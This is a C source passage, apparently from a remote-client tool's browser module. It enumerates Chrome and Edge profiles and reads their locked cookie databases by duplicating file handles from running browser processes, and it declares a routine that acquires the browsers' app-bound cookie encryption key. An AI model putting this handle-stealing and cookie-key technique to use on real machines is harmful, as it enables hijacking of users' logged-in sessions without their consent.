#include "Client.h"

#include <KNSoft/MakeLifeEasier/Data/Json.h>
#include <KNSoft/MakeLifeEasier/Net/Browser.h>
#include "../../KNSoft.ZPigeon.Client.SDK/Core/Snapshot.h"

#include <KNSoft/MakeLifeEasier/MakeLifeEasier.h>
#include <bcrypt.h>
#include <dpapi.h>
#include <roapi.h>
#include <strsafe.h>

#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Version.lib")
#pragma comment(lib, "winsqlite3.lib")

/* winsqlite3.dll is linked statically except sqlite3_deserialize: that export
   only exists since Windows 10 2004 (SQLite 3.31.1), so it stays dynamic and
   the handle-dup tier degrades gracefully on older systems */
#define SQLITE_API __declspec(dllimport)
#include <winsqlite/winsqlite3.h>

typedef int (*ZP_SQLITE_DESERIALIZE)(
    sqlite3*,
    const char*,
    unsigned char*,
    sqlite3_int64,
    sqlite3_int64,
    unsigned);

static ZP_SQLITE_DESERIALIZE ZpBrowser_SqliteDeserialize;

typedef struct _ZP_BROWSER_COOKIE_KEY
{
    BYTE Data[32];
    ULONG Length;
    BYTE V20Data[32];
    ULONG V20Length;
    BOOLEAN V20Attempted;
} ZP_BROWSER_COOKIE_KEY, *PZP_BROWSER_COOKIE_KEY;

typedef const ZP_BROWSER_COOKIE_KEY* PCZP_BROWSER_COOKIE_KEY;

/* AbeKey.c */
#define ZP_ABE_EDGE   0
#define ZP_ABE_CHROME 1

NTSTATUS
ZpAbeAcquireCookieKey(
    _In_ DWORD Browser,
    _Out_writes_bytes_(32) PBYTE Key,
    _Out_opt_ PULONG ResultCode);

typedef struct _ZP_BROWSER_BUILDER
{
    PBYTE Buffer;
    ULONG Length;
    ULONG Count;
    ULONG Capacity;
    ULONGLONG LastId;
} ZP_BROWSER_BUILDER, *PZP_BROWSER_BUILDER;

static
NTSTATUS
ZpBrowser_ReserveBuilder(
    _Inout_ PZP_BROWSER_BUILDER Builder,
    _In_ ULONG AdditionalLength)
{
    PBYTE Buffer;
    ULONG Capacity, RequiredLength;

    if (AdditionalLength > ZP_RESPONSE_MAX_PAYLOAD_SIZE - Builder->Length) return STATUS_BUFFER_OVERFLOW;
    RequiredLength = Builder->Length + AdditionalLength;
    if (RequiredLength <= Builder->Capacity) return STATUS_SUCCESS;
    Capacity = Builder->Capacity == 0 ? 1024 : Builder->Capacity;
    while (Capacity < RequiredLength) Capacity = min(Capacity * 2, ZP_RESPONSE_MAX_PAYLOAD_SIZE);
    Buffer = Mem_ReAlloc(Builder->Buffer, Capacity);
    if (Buffer == NULL) return STATUS_NO_MEMORY;
    Builder->Buffer = Buffer;
    Builder->Capacity = Capacity;
    return STATUS_SUCCESS;
}

static
NTSTATUS
ZpBrowser_AddRecord(
    _Inout_ PZP_BROWSER_BUILDER Builder,
    _In_ ZP_BROWSER_KIND Kind,
    _In_ ZP_BROWSER_TYPE Browser,
    _In_ ULONGLONG Id,
    _In_opt_ PCZP_BROWSER_RECORD_DATA Data,
    _In_ PCWSTR Identity,
    _In_opt_ PCWSTR Name,
    _In_opt_ PCWSTR Location,
    _In_opt_ PCWSTR Detail)
{
    ZP_BROWSER_RECORD Record;
    ULONG RecordLength;
    NTSTATUS Status;

    if (Builder->Count == ZP_BROWSER_MAX_PAGE_RECORDS)
    {
        return STATUS_QUOTA_EXCEEDED;
    }
    Record.Kind = Kind;
    Record.Browser = Browser;
    Record.Id = Id;
    if (Data != NULL) Record.Data = *Data;
    Record.Identity = Identity;
    Record.IdentityLength = (ULONG)wcslen(Identity);
    Record.Name = Name;
    Record.NameLength = Name == NULL ? 0 : (ULONG)wcslen(Name);
    Record.Location = Location;
    Record.LocationLength = Location == NULL ? 0 : (ULONG)wcslen(Location);
    Record.Detail = Detail;
    Record.DetailLength = Detail == NULL ? 0 : (ULONG)wcslen(Detail);
    Status = ZpBrowser_EncodeRecord(&Record, NULL, 0, &RecordLength);
    if (!NT_SUCCESS(Status)) return Status;
    if (Builder->Length == 0) Builder->Length = sizeof(ULONGLONG) + sizeof(USHORT);
    Status = ZpBrowser_ReserveBuilder(Builder, RecordLength);
    if (!NT_SUCCESS(Status)) return Status;
    Status = ZpBrowser_EncodeRecord(&Record,
                                    Builder->Buffer + Builder->Length,
                                    Builder->Capacity - Builder->Length,
                                    &RecordLength);
    if (NT_SUCCESS(Status))
    {
        Builder->Length += RecordLength;
        Builder->Count++;
        Builder->LastId = Id;
    }
    return Status;
}

static
VOID
ZpBrowser_FreeBuilder(
    _Inout_ PZP_BROWSER_BUILDER Builder)
{
    Mem_Free(Builder->Buffer);
}

static
NTSTATUS
ZpBrowser_EncodeBuilder(
    _In_ PZP_BROWSER_BUILDER Builder,
    _In_ ULONGLONG NextCursor,
    _Outptr_result_bytebuffer_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    NTSTATUS Status;

    if (Builder->Length == 0)
    {
        Status = ZpBrowser_ReserveBuilder(Builder, sizeof(ULONGLONG) + sizeof(USHORT));
        if (!NT_SUCCESS(Status)) return Status;
        Builder->Length = sizeof(ULONGLONG) + sizeof(USHORT);
    }
    Status = ZpBrowser_EncodePageHeader(NextCursor, Builder->Count, Builder->Buffer);
    if (!NT_SUCCESS(Status)) return Status;
    *Response = Builder->Buffer;
    *ResponseLength = Builder->Length;
    Builder->Buffer = NULL;
    return STATUS_SUCCESS;
}

static
LOGICAL
ZpBrowser_FileExists(
    _In_ PCWSTR Path)
{
    ULONG Attributes = GetFileAttributesW(Path);

    return Attributes != INVALID_FILE_ATTRIBUTES && !(Attributes & FILE_ATTRIBUTE_DIRECTORY);
}

static
NTSTATUS
ZpBrowser_GetUserData(
    _In_ ZP_BROWSER_TYPE Browser,
    _In_ PCZP_STRING_VIEW Override,
    _Out_writes_(MAX_PATH) PWSTR UserData)
{
    PNET_BROWSER_INFO Browsers;
    NET_BROWSER_TYPE Type;
    ULONG Count, Index;
    NTSTATUS Status;

    if (Override->Length != 0)
    {
        if (Override->Length >= MAX_PATH) return STATUS_NAME_TOO_LONG;
        RtlCopyMemory(UserData, Override->Buffer, (SIZE_T)Override->Length * sizeof(WCHAR));
        UserData[Override->Length] = UNICODE_NULL;
        return STATUS_SUCCESS;
    }
    Status = Net_BrowserEnumerate(&Browsers, &Count);
    if (!NT_SUCCESS(Status)) return Status;
    Type = Browser == ZpBrowserChrome ? NetBrowserChrome : NetBrowserEdge;
    Status = STATUS_NOT_FOUND;
    for (Index = 0; Index < Count; Index++)
    {
        if (Browsers[Index].Type == Type)
        {
            Str_CopyExW(UserData, MAX_PATH, Browsers[Index].UserDataDir);
            Status = STATUS_SUCCESS;
            break;
        }
    }
    Mem_Free(Browsers);
    return Status;
}

static
_Success_(NT_SUCCESS(return))
NTSTATUS
ZpBrowser_GetVersion(
    _In_ PCWSTR Path,
    _Out_writes_(VersionCapacity) PWSTR Version,
    _In_ ULONG VersionCapacity)
{
    VS_FIXEDFILEINFO* Info;
    PBYTE Buffer;
    UINT InfoLength;
    DWORD Handle, Size = GetFileVersionInfoSizeW(Path, &Handle);
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    if (Size == 0) return NTSTATUS_FROM_WIN32(GetLastError());
    Buffer = Mem_Alloc(Size);
    if (Buffer == NULL) return STATUS_NO_MEMORY;
    if (GetFileVersionInfoW(Path, 0, Size, Buffer) &&
        VerQueryValueW(Buffer, L"\\", (PVOID*)&Info, &InfoLength) &&
        InfoLength >= sizeof(*Info))
    {
        Status = StringCchPrintfW(Version,
                                  VersionCapacity,
                                  L"%hu.%hu.%hu.%hu",
                                  HIWORD(Info->dwFileVersionMS),
                                  LOWORD(Info->dwFileVersionMS),
                                  HIWORD(Info->dwFileVersionLS),
                                  LOWORD(Info->dwFileVersionLS));
    }
    Mem_Free(Buffer);
    return Status;
}

static
ZP_STATUS
ZpBrowser_EnumerateProfiles(
    _In_ ZP_BROWSER_TYPE Browser,
    _In_ PCWSTR UserData,
    _Inout_ PZP_BROWSER_BUILDER Builder)
{
    PNET_BROWSER_PROFILE Profiles;
    WCHAR Path[MAX_PATH];
    ULONG Count, Index;
    NTSTATUS Status;

    Status = Net_BrowserEnumerateProfiles(UserData, &Profiles, &Count);
    if (!NT_SUCCESS(Status))
    {
        return Status == STATUS_OBJECT_NAME_NOT_FOUND || Status == STATUS_OBJECT_PATH_NOT_FOUND ?
                   ZpStatus_Make(ZpStatusNone, 0) : ZpStatus_FromNtStatus(Status);
    }
    for (Index = 0; Index < Count && NT_SUCCESS(Status); Index++)
    {
        if (FAILED(StringCchPrintfW(Path,
                                    ARRAYSIZE(Path),
                                    L"%s\\%s",
                                    UserData,
                                    Profiles[Index].Directory)))
        {
            continue;
        }
        Status = ZpBrowser_AddRecord(Builder,
                                     ZpBrowserKindProfile,
                                     Browser,
                                     0,
                                     NULL,
                                     Profiles[Index].Directory,
                                     Str_EqualW(Profiles[Index].Name, Profiles[Index].Directory) ?
                                         NULL : Profiles[Index].Name,
                                     Path,
                                     NULL);
    }
    Mem_Free(Profiles);
    return ZpStatus_FromNtStatus(Status);
}

static
ZP_STATUS
ZpBrowser_Enumerate(
    _Outptr_result_bytebuffer_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    ZP_BROWSER_BUILDER Builder = { 0 };
    PNET_BROWSER_INFO Browsers;
    WCHAR Version[64];
    ZP_BROWSER_TYPE Browser;
    ULONG Count, Index;
    NTSTATUS NtStatus;
    ZP_STATUS Status;

    NtStatus = Net_BrowserEnumerate(&Browsers, &Count);
    if (!NT_SUCCESS(NtStatus)) return ZpStatus_FromNtStatus(NtStatus);
    Status = ZpStatus_Make(ZpStatusNone, 0);
    for (Index = 0; Index < Count && ZpStatus_IsSuccess(Status); Index++)
    {
        Browser = Browsers[Index].Type == NetBrowserChrome ? ZpBrowserChrome : ZpBrowserEdge;
        if (!NT_SUCCESS(ZpBrowser_GetVersion(Browsers[Index].ExePath, Version, ARRAYSIZE(Version))))
        {
            Version[0] = UNICODE_NULL;
        }
        NtStatus = ZpBrowser_AddRecord(&Builder,
                                       ZpBrowserKindBrowser,
                                       Browser,
                                       0,
                                       NULL,
                                       L"",
                                       NULL,
                                       Browsers[Index].ExePath,
                                       Version);
        Status = ZpStatus_FromNtStatus(NtStatus);
        if (ZpStatus_IsSuccess(Status))
        {
            Status = ZpBrowser_EnumerateProfiles(Browser, Browsers[Index].UserDataDir, &Builder);
        }
    }
    Mem_Free(Browsers);
    if (ZpStatus_IsSuccess(Status))
    {
        Status = ZpStatus_FromNtStatus(ZpBrowser_EncodeBuilder(&Builder, 0, Response, ResponseLength));
    }
    ZpBrowser_FreeBuilder(&Builder);
    return Status;
}

static
LOGICAL
ZpBrowser_IsProfileValid(
    _In_ PCZP_STRING_VIEW Profile)
{
    ULONG Index;

    if (Profile->Length == 0 || Profile->Length >= MAX_PATH ||
        (Profile->Length == 1 && Profile->Buffer[0] == L'.') ||
        (Profile->Length == 2 && Profile->Buffer[0] == L'.' && Profile->Buffer[1] == L'.'))
    {
        return FALSE;
    }
    for (Index = 0; Index < Profile->Length; Index++)
    {
        if (Profile->Buffer[Index] == L'\\' || Profile->Buffer[Index] == L'/' ||
            Profile->Buffer[Index] == L':')
        {
            return FALSE;
        }
    }
    return TRUE;
}

static
NTSTATUS
ZpBrowser_CopyProfile(
    _In_ PCZP_STRING_VIEW Profile,
    _Out_writes_(MAX_PATH) PWSTR Value)
{
    if (!ZpBrowser_IsProfileValid(Profile)) return STATUS_INVALID_PARAMETER;
    RtlCopyMemory(Value, Profile->Buffer, (SIZE_T)Profile->Length * sizeof(WCHAR));
    Value[Profile->Length] = UNICODE_NULL;
    return STATUS_SUCCESS;
}

static
LOGICAL
ZpBrowser_IsDotDirectory(
    _In_ PFILE_DIRECTORY_INFORMATION Information)
{
    return (Information->FileNameLength == sizeof(WCHAR) && Information->FileName[0] == L'.') ||
           (Information->FileNameLength == 2 * sizeof(WCHAR) &&
            Information->FileName[0] == L'.' && Information->FileName[1] == L'.');
}

static
NTSTATUS
ZpBrowser_QueryDirectorySize(
    _In_ HANDLE Directory,
    _Out_ PULONGLONG Size)
{
    FILE_FIND Find;
    PFILE_DIRECTORY_INFORMATION Information;
    OBJECT_ATTRIBUTES Object;
    IO_STATUS_BLOCK IoStatus;
    UNICODE_STRING Name;
    HANDLE Child;
    ULONGLONG ChildSize, Total = 0;
    NTSTATUS Status;

    Status = IO_BeginFindFile(&Find, Directory, NULL, FileDirectoryInformation);
    if (!NT_SUCCESS(Status)) return Status;
    while (NT_SUCCESS(Status) && Find.HasData)
    {
        Information = Find.Buffer;
        for (;;)
        {
            if (!ZpBrowser_IsDotDirectory(Information))
            {
                if (Information->FileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                {
                    if (!(Information->FileAttributes & FILE_ATTRIBUTE_REPARSE_POINT))
                    {
                        if (Information->FileNameLength > MAXUSHORT)
                        {
                            Status = STATUS_NAME_TOO_LONG;
                            break;
                        }
                        Name.Buffer = Information->FileName;
                        Name.Length = (USHORT)Information->FileNameLength;
                        Name.MaximumLength = Name.Length;
                        InitializeObjectAttributes(&Object,
                                                   &Name,
                                                   OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
                                                   Directory,
                                                   NULL);
                        Status = NtOpenFile(&Child,
                                            FILE_LIST_DIRECTORY | SYNCHRONIZE,
                                            &Object,
                                            &IoStatus,
                                            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                                            FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT |
                                                FILE_OPEN_REPARSE_POINT);
                        if (!NT_SUCCESS(Status)) break;
                        Status = ZpBrowser_QueryDirectorySize(Child, &ChildSize);
                        NtClose(Child);
                        if (!NT_SUCCESS(Status)) break;
                        if (ChildSize > MAXULONGLONG - Total)
                        {
                            Status = STATUS_INTEGER_OVERFLOW;
                            break;
                        }
                        Total += ChildSize;
                    }
                }
                else
                {
                    if (Information->EndOfFile.QuadPart < 0 ||
                        (ULONGLONG)Information->EndOfFile.QuadPart > MAXULONGLONG - Total)
                    {
                        Status = STATUS_INTEGER_OVERFLOW;
                        break;
                    }
                    Total += Information->EndOfFile.QuadPart;
                }
            }
            if (Information->NextEntryOffset == 0) break;
            Information = Add2Ptr(Information, Information->NextEntryOffset);
        }
        if (NT_SUCCESS(Status)) Status = IO_ContinueFindFileFind(&Find);
    }
    IO_EndFindFile(&Find);
    if (NT_SUCCESS(Status)) *Size = Total;
    return Status;
}

static
NTSTATUS
ZpBrowser_QueryAvailableSpace(
    _In_ HANDLE File,
    _Out_ PULONGLONG AvailableSpace)
{
    FILE_FS_SIZE_INFORMATION Information;
    IO_STATUS_BLOCK IoStatus;
    ULONGLONG AllocationUnitSize;
    NTSTATUS Status;

    Status = NtQueryVolumeInformationFile(File,
                                          &IoStatus,
                                          &Information,
                                          sizeof(Information),
                                          FileFsSizeInformation);
    if (!NT_SUCCESS(Status)) return Status;
    if (Information.AvailableAllocationUnits.QuadPart < 0) return STATUS_DATA_ERROR;
    AllocationUnitSize = (ULONGLONG)Information.SectorsPerAllocationUnit * Information.BytesPerSector;
    if (AllocationUnitSize == 0) return STATUS_DATA_ERROR;
    if ((ULONGLONG)Information.AvailableAllocationUnits.QuadPart > MAXULONGLONG / AllocationUnitSize)
    {
        return STATUS_INTEGER_OVERFLOW;
    }
    *AvailableSpace = (ULONGLONG)Information.AvailableAllocationUnits.QuadPart * AllocationUnitSize;
    return STATUS_SUCCESS;
}

static
NTSTATUS
ZpBrowser_QueryRunning(
    _In_ ZP_BROWSER_TYPE Browser,
    _Out_ PBOOLEAN Running)
{
    PSYSTEM_PROCESS_INFORMATION Processes, Process;
    UNICODE_STRING ImageName;
    BOOLEAN Found = FALSE;
    NTSTATUS Status;

    Status = Sys_QueryDynamicInfo(SystemProcessInformation, (PVOID*)&Processes);
    if (!NT_SUCCESS(Status)) return Status;
    RtlInitUnicodeString(&ImageName, Browser == ZpBrowserChrome ? L"chrome.exe" : L"msedge.exe");
    Process = Processes;
    for (;;)
    {
        if (RtlEqualUnicodeString(&Process->ImageName, &ImageName, TRUE))
        {
            Found = TRUE;
            break;
        }
        if (Process->NextEntryOffset == 0) break;
        Process = Add2Ptr(Process, Process->NextEntryOffset);
    }
    Sys_FreeInfo(Processes);
    *Running = Found;
    return STATUS_SUCCESS;
}

static
ZP_STATUS
ZpBrowser_InspectProfile(
    _In_ ZP_BROWSER_TYPE Browser,
    _In_ PCZP_STRING_VIEW Profile,
    _In_ PCZP_STRING_VIEW UserDataOverride,
    _Outptr_result_bytebuffer_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    ZP_BROWSER_PROFILE_INSPECTION Inspection;
    FILE_NETWORK_OPEN_INFORMATION LocalStateInformation;
    OBJECT_ATTRIBUTES Object;
    UNICODE_STRING NativePath;
    WCHAR UserData[MAX_PATH], ProfileName[MAX_PATH], Path[MAX_PATH];
    IO_STATUS_BLOCK IoStatus;
    HANDLE Directory;
    ULONG Length;
    NTSTATUS Status;

    Status = ZpBrowser_CopyProfile(Profile, ProfileName);
    if (NT_SUCCESS(Status)) Status = ZpBrowser_GetUserData(Browser, UserDataOverride, UserData);
    if (NT_SUCCESS(Status))
    {
        Status = StringCchPrintfW(Path, ARRAYSIZE(Path), L"%s\\%s", UserData, ProfileName);
    }
    if (NT_SUCCESS(Status)) Status = NT_Win32PathToNtPath(Path, NULL, &NativePath);
    if (!NT_SUCCESS(Status)) return ZpStatus_FromNtStatus(Status);
    InitializeObjectAttributes(&Object, &NativePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    Status = NtOpenFile(&Directory,
                        FILE_LIST_DIRECTORY | FILE_READ_ATTRIBUTES | SYNCHRONIZE,
                        &Object,
                        &IoStatus,
                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                        FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_OPEN_REPARSE_POINT);
    NT_FreeNtPath(&NativePath);
    if (!NT_SUCCESS(Status)) return ZpStatus_FromNtStatus(Status);
    Status = ZpBrowser_QueryDirectorySize(Directory, &Inspection.ProfileSize);
    NtClose(Directory);
    if (NT_SUCCESS(Status))
    {
        Status = StringCchCopyW(Path, ARRAYSIZE(Path), UserData);
    }
    if (NT_SUCCESS(Status)) Status = NT_Win32PathToNtPath(Path, NULL, &NativePath);
    if (NT_SUCCESS(Status))
    {
        Status = IO_OpenDirectory(&Directory,
                                  &NativePath,
                                  FILE_READ_ATTRIBUTES | SYNCHRONIZE,
                                  FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE);
        NT_FreeNtPath(&NativePath);
    }
    if (NT_SUCCESS(Status))
    {
        Status = ZpBrowser_QueryAvailableSpace(Directory, &Inspection.AvailableSpace);
        NtClose(Directory);
    }
    if (NT_SUCCESS(Status)) Status = StringCchPrintfW(Path, ARRAYSIZE(Path), L"%s\\Local State", UserData);
    if (NT_SUCCESS(Status)) Status = IO_GetWin32FileAttributes(Path, NULL, &LocalStateInformation);
    if (Status == STATUS_OBJECT_NAME_NOT_FOUND || Status == STATUS_OBJECT_PATH_NOT_FOUND ||
        Status == STATUS_NO_SUCH_FILE)
    {
        Status = STATUS_SUCCESS;
    }
    else if (NT_SUCCESS(Status))
    {
        if (LocalStateInformation.EndOfFile.QuadPart < 0 ||
            (ULONGLONG)LocalStateInformation.EndOfFile.QuadPart > MAXULONGLONG - Inspection.ProfileSize)
        {
            Status = STATUS_INTEGER_OVERFLOW;
        }
        else
        {
            Inspection.ProfileSize += LocalStateInformation.EndOfFile.QuadPart;
        }
    }
    if (NT_SUCCESS(Status)) Status = ZpBrowser_QueryRunning(Browser, &Inspection.BrowserRunning);
    if (NT_SUCCESS(Status)) Status = ZpBrowser_EncodeProfileInspection(&Inspection, NULL, 0, &Length);
    if (NT_SUCCESS(Status))
    {
        *Response = Mem_Alloc(Length);
        if (*Response == NULL) Status = STATUS_NO_MEMORY;
    }
    if (NT_SUCCESS(Status))
    {
        Status = ZpBrowser_EncodeProfileInspection(&Inspection, *Response, Length, ResponseLength);
    }
    return ZpStatus_FromNtStatus(Status);
}

static
ZP_SQLITE_DESERIALIZE
ZpBrowser_ResolveSqliteDeserialize(VOID)
{
    ZP_SQLITE_DESERIALIZE Deserialize = ZpBrowser_SqliteDeserialize;

    if (Deserialize == NULL)
    {
        /* winsqlite3.dll is statically imported, so it is always loaded */
        Deserialize = (ZP_SQLITE_DESERIALIZE)(PVOID)GetProcAddress(
            GetModuleHandleW(L"winsqlite3.dll"),
            "sqlite3_deserialize");
        ZpBrowser_SqliteDeserialize = Deserialize;
    }
    return Deserialize;
}

static
PSTR
ZpBrowser_PathToUri(
    _In_ PCWSTR Path,
    _In_z_ PCSTR Query)
{
    static const CHAR Prefix[] = "file:";
    static const CHAR Hex[] = "0123456789ABCDEF";
    CHAR Utf8[MAX_PATH * 3];
    ULONG Bytes, Index;
    SIZE_T QueryLength;
    PSTR Value, Output;
    NTSTATUS Status;

    QueryLength = strlen(Query);
    Status = RtlUnicodeToUTF8N(Utf8,
                               sizeof(Utf8),
                               &Bytes,
                               Path,
                               (ULONG)wcslen(Path) * sizeof(WCHAR));
    if (!NT_SUCCESS(Status)) return NULL;
    Value = Mem_Alloc(sizeof(Prefix) - 1 + (SIZE_T)Bytes * 3 + QueryLength + 1);
    if (Value == NULL) return NULL;
    Output = Value;
    RtlCopyMemory(Output, Prefix, sizeof(Prefix) - 1);
    Output += sizeof(Prefix) - 1;
    for (Index = 0; Index < Bytes; Index++)
    {
        if (Utf8[Index] == '%' || Utf8[Index] == '?' || Utf8[Index] == '#')
        {
            *Output++ = '%';
            *Output++ = Hex[(UCHAR)Utf8[Index] >> 4];
            *Output++ = Hex[(UCHAR)Utf8[Index] & 0xF];
        }
        else
        {
            *Output++ = Utf8[Index] == '\\' ? '/' : Utf8[Index];
        }
    }
    RtlCopyMemory(Output, Query, QueryLength);
    Output[QueryLength] = ANSI_NULL;
    return Value;
}

static
NTSTATUS
ZpBrowser_QueryProcessHandles(
    _In_ HANDLE Process,
    _Outptr_ PPROCESS_HANDLE_SNAPSHOT_INFORMATION* Handles)
{
    ULONG Length = 64 * 1024, Required;
    NTSTATUS Status;

    for (;;)
    {
        *Handles = Mem_Alloc(Length);
        if (*Handles == NULL) return STATUS_NO_MEMORY;
        Status = NtQueryInformationProcess(Process, ProcessHandleInformation, *Handles, Length, &Required);
        if (Status != STATUS_INFO_LENGTH_MISMATCH) break;
        Mem_Free(*Handles);
        Length = max(Length * 2, Required);
        if (Length > 16 * 1024 * 1024) return STATUS_QUOTA_EXCEEDED;
    }
    if (!NT_SUCCESS(Status)) Mem_Free(*Handles);
    return Status;
}

static
NTSTATUS
ZpBrowser_QueryDatabaseId(
    _In_ PCWSTR DatabasePath,
    _Out_ PFILE_ID_INFORMATION Id)
{
    DECLSPEC_ALIGN(8) BYTE Buffer[PAGE_SIZE];
    PFILE_ID_EXTD_DIR_INFORMATION Information = (PVOID)Buffer;
    WCHAR DirectoryPath[MAX_PATH];
    OBJECT_ATTRIBUTES Object;
    UNICODE_STRING NtPath, Search;
    IO_STATUS_BLOCK IoStatus;
    HANDLE Directory;
    PWSTR Name;
    BOOL HasData;
    NTSTATUS Status;

    Status = StringCchCopyW(DirectoryPath, ARRAYSIZE(DirectoryPath), DatabasePath);
    if (!NT_SUCCESS(Status)) return Status;
    Name = wcsrchr(DirectoryPath, L'\\');
    if (Name == NULL || Name[1] == UNICODE_NULL) return STATUS_INVALID_PARAMETER;
    RtlInitUnicodeString(&Search, Name + 1);
    *Name = UNICODE_NULL;
    Status = NT_InitWin32PathObject(&Object, DirectoryPath, NULL, &NtPath);
    if (!NT_SUCCESS(Status)) return Status;
    Status = NtOpenFile(&Directory,
                        FILE_LIST_DIRECTORY | FILE_READ_ATTRIBUTES | SYNCHRONIZE,
                        &Object,
                        &IoStatus,
                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                        FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);
    NT_FreeNtPath(&NtPath);
    if (!NT_SUCCESS(Status)) return Status;
    Status = NtQueryInformationFile(Directory, &IoStatus, Id, sizeof(*Id), FileIdInformation);
    if (NT_SUCCESS(Status))
    {
        Status = IO_FindFile(Directory,
                             Buffer,
                             sizeof(Buffer),
                             FileIdExtdDirectoryInformation,
                             &Search,
                             TRUE,
                             &HasData);
    }
    NtClose(Directory);
    if (NT_SUCCESS(Status) && !HasData) return STATUS_OBJECT_NAME_NOT_FOUND;
    if (NT_SUCCESS(Status)) Id->FileId = Information->FileId;
    return Status;
}

/* duplicates the handle matching Id from Process' handle table and maps the
   file read-only into this process */
static
NTSTATUS
ZpBrowser_MapOwnerHandle(
    _In_ HANDLE Process,
    _In_ const FILE_ID_INFORMATION* Id,
    _Out_ PIO_FILE_MAP Map,
    _Out_ PLOGICAL Found)
{
    PPROCESS_HANDLE_SNAPSHOT_INFORMATION Handles;
    FILE_ID_INFORMATION CandidateId;
    IO_STATUS_BLOCK IoStatus;
    HANDLE Candidate;
    ULONG Index;
    NTSTATUS Status;

    *Found = FALSE;
    Status = ZpBrowser_QueryProcessHandles(Process, &Handles);
    if (!NT_SUCCESS(Status)) return Status;
    for (Index = 0; Index < Handles->NumberOfHandles && !*Found; Index++)
    {
        if (!NT_SUCCESS(NtDuplicateObject(Process,
                                          Handles->Handles[Index].HandleValue,
                                          NtCurrentProcess(),
                                          &Candidate,
                                          FILE_READ_DATA | FILE_READ_ATTRIBUTES,
                                          0,
                                          0)))
        {
            continue;
        }
        if (GetFileType(Candidate) == FILE_TYPE_DISK &&
            NT_SUCCESS(NtQueryInformationFile(Candidate,
                                              &IoStatus,
                                              &CandidateId,
                                              sizeof(CandidateId),
                                              FileIdInformation)) &&
            RtlEqualMemory(&CandidateId, Id, sizeof(CandidateId)))
        {
            Status = IO_MapReadOnlyFile(Candidate, Map);
            *Found = NT_SUCCESS(Status);
        }
        NtClose(Candidate);
    }
    Mem_Free(Handles);
    return Status;
}

/* fast path: an attributes-only open succeeds while the browser holds the
   database busy, and yields both the file id and the list of owning processes */
static
NTSTATUS
ZpBrowser_MapDatabaseHandleByOwners(
    _In_ PCWSTR DatabasePath,
    _Out_ PIO_FILE_MAP Map,
    _Out_ PLOGICAL Found)
{
    FILE_PROCESS_IDS_USING_FILE_INFORMATION* Owners = NULL;
    FILE_ID_INFORMATION Id;
    IO_STATUS_BLOCK IoStatus;
    HANDLE File, Process;
    ULONG Length, Index;
    NTSTATUS Status;

    *Found = FALSE;
    Status = IO_OpenWin32File(&File,
                              DatabasePath,
                              NULL,
                              FILE_READ_ATTRIBUTES | SYNCHRONIZE,
                              FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE);
    if (!NT_SUCCESS(Status)) return Status;
    Status = NtQueryInformationFile(File, &IoStatus, &Id, sizeof(Id), FileIdInformation);
    if (NT_SUCCESS(Status))
    {
        Length = FIELD_OFFSET(FILE_PROCESS_IDS_USING_FILE_INFORMATION, ProcessIdList) +
                 16 * sizeof(ULONG_PTR);
        for (;;)
        {
            PVOID NewBuffer = Mem_ReAlloc(Owners, Length);

            if (NewBuffer == NULL)
            {
                Status = STATUS_NO_MEMORY;
                break;
            }
            Owners = NewBuffer;
            Status = NtQueryInformationFile(File,
                                            &IoStatus,
                                            Owners,
                                            Length,
                                            FileProcessIdsUsingFileInformation);
            if (Status != STATUS_INFO_LENGTH_MISMATCH && Status != STATUS_BUFFER_OVERFLOW &&
                Status != STATUS_BUFFER_TOO_SMALL)
            {
                break;
            }
            Length *= 2;
            if (Length > 1 << 20)
            {
                Status = STATUS_BUFFER_TOO_SMALL;
                break;
            }
        }
        if (NT_SUCCESS(Status))
        {
            for (Index = 0; Index < Owners->NumberOfProcessIdsInList && !*Found; Index++)
            {
                if (!NT_SUCCESS(PS_OpenProcess(&Process,
                                               PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
                                               (ULONG)(ULONG_PTR)Owners->ProcessIdList[Index])))
                {
                    continue;
                }
                Status = ZpBrowser_MapOwnerHandle(Process, &Id, Map, Found);
                NtClose(Process);
            }
        }
        Mem_Free(Owners);
    }
    NtClose(File);
    return Status;
}

/* fallback: locate the browser processes by image name and match their
   handles by file id (works even when an attributes-only open is denied) */
static
NTSTATUS
ZpBrowser_MapDatabaseHandleByScan(
    _In_ ZP_BROWSER_TYPE Browser,
    _In_ PCWSTR DatabasePath,
    _Out_ PIO_FILE_MAP Map,
    _Out_ PLOGICAL Found)
{
    PSYSTEM_PROCESS_INFORMATION Processes, Process;
    FILE_ID_INFORMATION Id;
    UNICODE_STRING ImageName;
    HANDLE BrowserProcess;
    NTSTATUS Status;

    *Found = FALSE;
    Status = ZpBrowser_QueryDatabaseId(DatabasePath, &Id);
    if (!NT_SUCCESS(Status)) return Status;
    Status = Sys_QueryDynamicInfo(SystemProcessInformation, (PVOID*)&Processes);
    if (!NT_SUCCESS(Status)) return Status;
    RtlInitUnicodeString(&ImageName, Browser == ZpBrowserChrome ? L"chrome.exe" : L"msedge.exe");
    Process = Processes;
    for (;;)
    {
        if (RtlEqualUnicodeString(&Process->ImageName, &ImageName, TRUE))
        {
            Status = STATUS_OBJECT_NAME_NOT_FOUND;
            if (NT_SUCCESS(PS_OpenProcess(&BrowserProcess,
                                          PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
                                          (ULONG)(ULONG_PTR)Process->UniqueProcessId)))
            {
                Status = ZpBrowser_MapOwnerHandle(BrowserProcess, &Id, Map, Found);
                NtClose(BrowserProcess);
